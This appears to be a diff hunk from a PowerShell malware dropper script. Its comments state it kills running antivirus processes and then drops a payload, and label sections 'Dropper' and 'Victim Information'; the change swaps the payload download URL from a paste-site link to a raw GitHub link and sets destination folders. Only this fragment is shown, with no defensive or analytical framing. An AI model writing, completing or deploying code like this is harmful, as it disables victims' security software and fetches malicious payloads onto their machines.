@@ -5,7 +5,7 @@
 # Kill any antivirus proccesses running, then drop payload
 
 #Dropper 
-$url = "https://hastebin.com/raw/opavoqaber" #sample link
+$url = "https://raw.githubusercontent.com/dskeene/thedisabledgap/main/main.ps1" #sample link
 $dest = "$HOME/Program Files/"
 $dest2 = '$HOME/Public'
 # Victim Information
